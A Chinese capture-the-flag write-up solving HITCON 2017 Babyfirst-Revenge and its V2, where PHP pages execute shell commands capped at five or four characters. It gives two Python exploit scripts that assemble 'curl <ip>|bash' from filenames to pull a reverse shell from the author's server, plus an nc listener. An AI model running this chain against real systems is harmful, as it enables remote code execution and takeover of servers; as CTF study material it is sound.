

<h2>[HITCON 2017]Babyfirst-Revenge</h2>


翻buuoj的时候看到了这道题，分值高达92分，只有32个师傅解出来了这道题，简单看了下其他师傅的wp，这道题似乎与Linux命令有关，很有意思，于是参考其他师傅的wp我准备挑战下这道题。

进入题目环境页面上直接出现了源码：

```
<?php
    echo $_SERVER['REMOTE_ADDR']."\n";
    $sandbox = '/var/www/html/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

简单分析下，题目会自动创建一个/var/www/html/sandbox/文件夹，然后切换目录至改位置，接着满足条件的情况下我们可以执行命令，不过这里有个很明显的难点，就是限制cmd参数的长度必须小于等于五，否则直接给你rm -rf了，所以现在的难点就在于怎么在命令长度受限的情况下实现get shell。

翻了翻<a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html">P牛的博客</a>，发现他早就提过这个小tips了，参考其他师傅的<a href="https://blog.csdn.net/u011377996/article/details/82464383">wp</a>，下面我们来简单分析下：

首先，linux中可以用\拼凑命令，比如<code>l\ s</code>，这样等效于ls：

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/1-2.png" alt="" class="wp-image-372"/></figure>


其次我们可以用<code>sh filename</code>执行文件里的有效文件命令，即使其中有非命令字符串也只会报错，还是会继续执行有效的文件命令：

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/2-2.png" alt="" class="wp-image-373"/></figure>


还有一个很经典的linux知识点，我们可以通过&gt;+fileanme来实现新建一个文件(&gt;是覆盖，&gt;&gt;是追加)，这个tips挺好用的，比如某个你在某个网站发现一个无回显的命令注入点，你可以用cat *&gt;1.txt，将内容全部写进1.txt里，然后通过访问1.txt来看到命令的执行结果。

现在我们已经学会了基础知识点，想必解决这道题一定是手到擒来((‾◡◝))

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/1-2.jpg" alt="" class="wp-image-374"/></figure>


简单思考下，怎么通过上面的三个知识点get shell呢，其实很简单。我们知道linux用ls -t可以按时间顺序罗列出各大文件，我们可以把我们的恶意代码比如

```
curl 10.188.2.20|bash
```


按时间顺序拆解成不同的文件，如cu/ rl/等等等，然后用同样的方法执行ls -t&gt;g，按时间顺序拼凑出你想要的命令，可能说起来有点复杂，看我(抄)的脚本就知道了：

```
import requests
from time import sleep
from urllib.parse import quote
 
 
payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 
 
    # generate `curl 82.157.233.xxx|bash` 这个ip也就是我的wps
    '>sh\ ', 
    '>ba\\', 
    '>\|\\',
    '>x\\', 
    '>xx\\',  
    '>3.\\',
    '>23\\', 
    '>7.\\',
    '>15\\', 
    '>2.\\', 
    '>8\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 
 
    # exec
    'sh _', 
    'sh g', 
]
 
 
 
r = requests.get('http://b5a65bfa-575e-43a8-9a44-fb0bf56cde88.node4.buuoj.cn:81//?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://b5a65bfa-575e-43a8-9a44-fb0bf56cde88.node4.buuoj.cn:81//?cmd=' + quote(i) )
    print(i)
    sleep(0.2)
```


直接拿这个脚本跑显然是跑不动的 ，首先你要去你wps里放反弹shell的代码（比如这样）

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/1-3.png" alt="" class="wp-image-376"/></figure>




这就是最常见的弹shell方式了，不懂可以看<a href="https://blog.csdn.net/mastergu2/article/details/120975065">这个</a>。

为了执行反弹shell，我们用艰难的方式构造出来了ls -tg，接下来只要按顺序构造出curl 82.157.233.xxx|bash，然后我们分别执行sh ，sh g，执行第一个文件是为了执行里面的内容ls -tg，执行了这个之后我们就在文件g里按时间顺序构造出了弹shell的代码，然后再执行sh g就成果弹shell了，我们这边只要监听你设定的端口就可以远程操控目标机了🎉🎉

```
nc -lvvp 9383   #监听9383端口，这里是我反弹shell的指定端口
```


然后在根目录下找到flag，拿下!

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/1-4.png" alt="" class="wp-image-379"/></figure>


写脚本的时候我遇到一个坑，浪费了我很多时间没能成功反弹shell，就是我构造ip的时候用了"&gt;.7\\"，懂Linux的都知道在文件名前加点号表示隐藏这个文件，但当时我没意识到这样会对最后构造的命令有影响，后面我本地试的时候才发现出了问题：

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/1-5.png" alt="" class="wp-image-380"/></figure>


可以看到这里我ls -t根本看不到.2这个文件，只有ls -a -t才行，只能说当时我太傻逼了。但通过这个题我还是学到了一种神奇的linux注入方法，可以比拟上次dasctf用*拿flag了。当我写完这道题时，发现还有道Babyfirst-Revenge-V2，对字符数再次做了限制，感觉挺有意思的，因此我准备再挑战一下。

<h2>[HITCON 2017]Babyfirst-Revenge-V2</h2>

```
<?php
    echo $_SERVER['REMOTE_ADDR']."\n";
    $sandbox = '/var/www/html/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

可以看到这道题和上道题唯一的差别就是从&lt;= 5缩减到了&lt;= 4，对利用条件再次做了苛刻的限制，那我们思考下在这种情况下该如何拿到flag呢？

首先，<code>ls&gt;&gt;_</code>这个技巧在这儿行不通了，现在只能有四个字符，这个不行的话会对我们构造命令产生极大的阻碍，用上道题的方法的话这里可能有点行不通。

简单分析下，首先反弹shell这里的思路是不变的，肯定还是要弹shell，而且回看我们之前构造<code>curl 82.157.233.xxx|bash</code>的代码，很明显每次执行都没超过四个字符(在/前加/是为了转义/，所以//其实就是/)，不过其实就算超过了也挺好解决的，再细分一下就行了，所以关键还是构造出<code>ls -th&gt;g</code>。

这里就要用到之前我提过的dasctf里用到过的一个知识点，在当前工作目录下使用*命令，会将目录名当作命令执行（顺序）

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/1-6.png" alt="" class="wp-image-386"/></figure>


可以看见这里有三个文件夹，我们输入他会匹配第一个cat然后作为命令执行。当然，作为通配符的也可以通过*s通配ls，这个算很常见的知识点了，有了这个东西我们就可以思考如何简化命令了。

但这里还有个问题，我们之前是用ls>>把所有文件写入的，而现在我们只有四个字符了，如果用ls的话会把所有东西都写进去，也就是本身也会写进_里，这无疑会对我们构造命令产生极大的影响，而且因为没法用，用/分割命令也没用，这时候又有一个小知识点或者说常识，用dir a bv会只把a b写进去，这样就不会对我们构造的命令产生影响了。

现在我们要思考如何像之前一样构造ls -t&gt;g，这里我看官方wp还用了rev也就是倒转的技巧，首先构造了<em>g&gt; ht- sl</em>，然后构造了rev文件夹，用*v&gt;x构造出了正向的ls -th&gt;g。

将 " ht- sl" 写到文件 "v"：

```
'>dir', 
'>sl', 
'>g\>',
'>ht-',
'*>v',
```

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/1-7.png" alt="" class="wp-image-387"/></figure>


然后倒转v里的字符放到x里：

```
'>rev',
'*v>x',
```

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/2-5.png" alt="" class="wp-image-388"/></figure>


剩下的就是像上道题一样构造curl yourip|bash了，这一点很简单，标准答案毕竟是标准答案，他的方法肯定是可行的，但我们得明白为啥要这么做，有没有其他方法。

首先，我们要明白，linux默认排列文件是按首字母排布的，所以dir在第一个，我们可以用*代替dir，所以不难发现我们这里用了'&gt;ht-'，而上题用的"&gt;-t"，根本目的都是为了构造出ls -t按时间顺序列出各个文件，而这个h参数其实没啥用，我们是为了按字母顺序排序文件才加上的，因此这里的构造其实每个字母都大有玄机，只有符合Linux的默认顺序我们才能最终构造出我们想要的命令。

脚本：

```
import requests
from time import sleep
from urllib.parse import quote
 
 
payload = [
    # 将 "g> ht- sl" 写到文件 "v"
    '>dir', 
    '>sl', 
    '>g\>',
    '>ht-',
    '*>v',
 
    # 将文件"v"中的字符串倒序，放到文件"x"，就变成了 "ls -th >g"
    '>rev',
    '*v>x',
 
    # curl 82.157.233.xxx
 
    '>\;\\',
    '>sh\\', 
    '>ba\\', 
    '>\|\\', 
    '>x\\',
    '>xx\\',
    '>3.\\',
    '>23\\',
    '>7.\\', 
    '>15\\', 
    '>2.\\', 
    '>8\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 
 
    # getshell
    'sh x', 
    'sh g', 
]
 
 
r = requests.get('http://01a3f24f-d53d-4ce1-923b-80bcfebc9699.node4.buuoj.cn:81/?reset=1')
for i in payload:
    assert len(i) <= 4
    r = requests.get('http://01a3f24f-d53d-4ce1-923b-80bcfebc9699.node4.buuoj.cn:81/?cmd=' + quote(i) )
    print(i)
    sleep(0.2)
```


这里又有个坑点，必须构造出curl 82.157.233.xxx后面还要构造出";"分割命令，否则我们的命令会被干扰不能发挥正常作用，执行的会是类似|bashxrev之类的完全不起作用的命令，我们弹了shell可以上去看看，可以看到这里bash和x之间如果没有分号的话执行的就是bashxrev等等奇怪的命令，所以我之前的复现失败了很久

<figure class="wp-block-image size-large"><img src="https://fushuling.com/wp-content/uploads/2022/11/1-8-1024x605.png" alt="" class="wp-image-390"/></figure>


而我们的第一题呢

<figure class="wp-block-image size-full"><img src="https://fushuling.com/wp-content/uploads/2022/11/2-7.png" alt="" class="wp-image-391"/></figure>


可以看到这里的文件名_起到了分隔符的作用，分隔了bash和&gt;g，自然不需要再加分号了，所以说这两道题连给文件起名字都大有玄机，不愧是hitcon的题，狠狠的学到了。



